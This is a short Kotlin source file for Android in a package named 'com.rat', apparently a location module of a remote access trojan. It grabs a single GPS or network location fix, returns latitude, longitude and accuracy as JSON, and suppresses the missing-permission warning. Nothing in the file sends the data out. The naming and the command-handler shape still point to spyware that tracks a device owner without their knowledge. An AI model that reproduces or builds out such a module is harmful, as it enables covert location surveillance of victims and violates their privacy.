package com.rat

import android.content.Context
import android.location.LocationManager
import android.os.Looper
import org.json.JSONObject
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object LocationHandler {
    fun get(ctx: Context): String {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val latch = CountDownLatch(1)
        var out = "no fix"

        @Suppress("MissingPermission")
        val provider = when {
            lm.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
            lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER) -> LocationManager.NETWORK_PROVIDER
            else -> return "location off"
        }

        @Suppress("MissingPermission")
        lm.requestSingleUpdate(provider, { loc ->
            out = JSONObject().apply {
                put("lat", loc.latitude)
                put("lon", loc.longitude)
                put("acc", loc.accuracy)
            }.toString()
            latch.countDown()
        }, Looper.getMainLooper())

        latch.await(15, TimeUnit.SECONDS)
        return out
    }
}
